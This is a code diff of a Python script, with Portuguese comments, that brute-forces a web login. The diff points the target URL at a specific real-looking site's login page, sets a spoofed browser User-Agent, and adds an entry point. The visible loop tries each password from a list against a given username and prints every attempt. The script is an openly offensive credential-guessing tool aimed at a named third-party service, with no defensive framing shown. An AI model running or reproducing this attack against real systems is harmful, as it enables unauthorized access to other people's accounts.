@@ -1,13 +1,12 @@
 import time
 import random
 import requests
-import requests
 from bs4 import BeautifulSoup
 import sys
 
 #dominio do site/endereço 
 
-url = ''
+url = 'https://meulead.desempenhodigital.com.br/login'
 headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}
 
 
@@ -77,3 +76,6 @@ def main():
         for password in passwords:
             bpk(user_input, password)
             print(f'Tentativa >> {user_input} : {password} \n')
+
+if __name__ == "__main__":
+    main()
